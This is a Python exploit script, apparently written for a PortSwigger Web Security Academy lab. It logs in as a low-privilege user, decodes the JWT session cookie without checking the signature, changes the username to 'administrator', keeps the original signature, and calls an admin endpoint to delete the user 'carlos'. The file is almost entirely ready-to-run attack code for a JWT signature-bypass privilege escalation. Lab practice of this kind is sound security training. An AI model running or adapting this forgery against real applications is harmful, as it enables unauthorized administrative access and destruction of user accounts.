import requests as rq
import subprocess
from bs4 import BeautifulSoup
import jwt
import base64


def delete_carlos(modified_token):
    cookies = {"session": modified_token}
    delete_url = f"{BASE}/admin/delete?username=carlos"

    r = rq.get(delete_url, cookies=cookies)

    if r.status_code == 200:
        print("[+] Done!")
    else:
        print(f"[-] Failed: {r.status_code}")

BASE = "https://0a79004004b0d2e080ddda1200320067.web-security-academy.net"
LOGIN = f"{BASE}/login"

s = rq.Session()

r = s.get(LOGIN)
soup = BeautifulSoup(r.text, "html.parser")
csrf = soup.find("input", {"name": "csrf"})["value"]

resp = s.post(LOGIN, data={
    "csrf": csrf,
    "username": "wiener",
    "password": "peter"
})

print("[+] Status:", resp.status_code)
# print("[+] Cookies:", s.cookies.get_dict())

jwt_token = s.cookies.get("session")
print("[+] JWT:", jwt_token)


decode_token = jwt.decode(jwt_token, options={"verify_signature": False})
print(f"[+] Decode token: {decode_token}\n")

header, payload, signature = jwt_token.split('.')
decode_payload = base64.urlsafe_b64decode(payload + '=' * (-len(payload) % 4))

modified_payload = decode_payload.replace(b'wiener', b'administrator')
print(f"[+] Modified payload: {modified_payload.decode()}\n")

modified_payload_b64 = base64.urlsafe_b64encode(modified_payload).rstrip(b'=').decode()
print(f"[+] Modified payload base64: {modified_payload_b64}\n")

modified_token = f"{header}.{modified_payload_b64}.{signature}"
print(f"[+] Modified token: {modified_token}\n")


delete_carlos(modified_token)